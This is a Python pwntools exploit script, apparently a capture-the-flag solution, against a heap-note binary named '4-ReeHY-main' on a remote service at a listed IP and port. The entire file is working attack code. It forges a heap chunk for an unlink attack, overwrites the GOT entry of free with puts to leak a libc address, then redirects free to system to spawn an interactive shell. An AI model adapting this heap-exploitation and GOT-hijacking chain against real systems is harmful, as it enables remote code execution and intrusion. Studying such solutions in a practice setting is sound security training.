from pwn import *

 

 
def welcome():
    p.recvuntil("$ ")
    p.sendline("tanghf")
 
def add(size,id,content):
    p.recvuntil("$ ")
    p.sendline("1")
    p.recvuntil("size\n")
    p.sendline(str(size))
    p.recvuntil("cun\n")
    p.sendline(str(id))
    p.recvuntil("content\n")
    p.sendline(content)
 
def remove(id):
    p.recvuntil("$ ")
    p.sendline("2")
    p.recvuntil("dele\n")
    p.sendline(str(id))
 
def edit(id,content):
    p.recvuntil("$ ")
    p.sendline("3")
    p.recvuntil("edit\n")
    p.sendline(str(id))
    p.recvuntil("content\n")
    p.send(content)

#p = process('4-ReeHY-main')
p = remote('111.198.29.45',39383)
elf = ELF('4-ReeHY-main')
libc = ELF('libc-2.23.so')
heap_addr=0x602100
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']
libc_system = libc.symbols['system']
libc_atoi = libc.symbols['atoi']


welcome()
add(144,0,'/bin/sh\x00')
add(144,1,'1')
add(144,2,'2')
add(144,3,'3')

remove(2)
remove(3)


payload = p64(0)+p64(0x91)+p64(heap_addr-0x18)+p64(heap_addr-0x10)+'a'*0x70+p64(0x90)+p64(0x90)

add(288,2,payload)

remove(3)



payload2 = p64(1)+p64(1)+p64(1)+p64(free_got)+p64(1)+p64(atoi_got)+'\n'
edit(2,payload2)
edit(2,p64(puts_plt))
remove(3)


atoi_addr = u64((p.recv(6)).ljust(8,'\x00'))
print "atoi_addr:"+hex(atoi_addr)

system_addr = atoi_addr-libc_atoi+libc_system
edit(2,p64(system_addr))
remove(0)
p.interactive()


